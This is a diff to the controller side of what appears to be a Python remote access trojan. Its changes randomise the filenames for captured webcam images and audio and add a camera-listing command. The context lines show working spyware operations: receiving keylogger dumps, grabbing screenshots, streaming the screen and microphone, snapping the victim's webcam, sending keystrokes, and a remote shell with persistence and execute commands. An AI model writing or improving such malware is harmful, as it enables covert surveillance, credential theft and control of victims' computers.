@@ -15,6 +15,8 @@ from fileattacker import download_file, upload_file
 from termcolor import cprint
 import numpy as np
 import sys
+import string
+import random
 
 def main_con():
     soc = None
@@ -44,6 +46,8 @@ def main_con():
             soc.close()
 
 main_log = threading.Event()
+char = string.ascii_letters
+random_str = "".join(random.choices(char, k=8))
 
 def send_format(sok, format):
     try:
@@ -145,10 +149,11 @@ def recv_keylog(_target):
         cprint("[-] No dump received, continuing", 'red')
         return None
     except OSError as e:
-        cprint(f'[error] {e}', 'red')
+        cprint(f'[-] Error: {e}', 'red')
         return None
 
-def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
+def start_image_server(host="0.0.0.0", port=9993):
+    save_as = f"{random_str}.jpg"
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.settimeout(23)
@@ -199,7 +204,8 @@ CHANNELS = 1
 RATE = 44100
 CHUNK = 1024
 
-def receive_and_save(WAVE_OUTPUT):
+def receive_and_save():
+    WAVE_OUTPUT = f"{random_str}.wav"
     frames = []
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -378,10 +384,8 @@ def data_diterima(_target):
             except socket.timeout:
                  continue
 
-def shellc(_target):
-    x = 0                      
+def shellc(_target):                      
     n = 0
-    p = 0
     cprint("[!] Type 'help' for help", 'yellow')
     cprint("[!] Use 'exit' or 'quit' to fully exit both server and client", 'yellow')
     cprint("[!] Use 'bg' or 'background' to background the current shell", 'yellow')
@@ -415,7 +419,7 @@ def shellc(_target):
             elif perintah ==  'screen_shot':
                 n += 1
                 time.sleep(0.1)
-                download_file(_target,"ss"+str(n)+".png")
+                download_file(_target,f"ss_{str(n)}.png")
             elif perintah == 'screen_share':
                 screen_record(host='0.0.0.0', port=9991) 
             elif perintah[:11] == 'persistence':
@@ -453,6 +457,8 @@ camera command:
  -start_cam >> access camera
 
  -snap_cam  >> snap camera
+
+ -list_cam  >> list available camera
 ================================
 
 screen command:
@@ -499,15 +505,13 @@ execution:
 ================================
                     """, 'yellow')
             elif perintah == 'rec_audio':
-                p += 1
-                receive_and_save('retrieved_audio'+str(p)+'.wav')
+                receive_and_save()
             elif perintah == 'live_audio':
                 do_streaming_audio()
             elif perintah == 'send_key':
                 keystroke()   
             elif perintah == 'snap_cam':
-                x += 1
-                start_image_server(save_as='webcam'+str(x)+'.jpg') 
+                start_image_server() 
             elif perintah[:7] == 'execute':
                 recv_status(_target)
             elif perintah[:4] == 'kill':
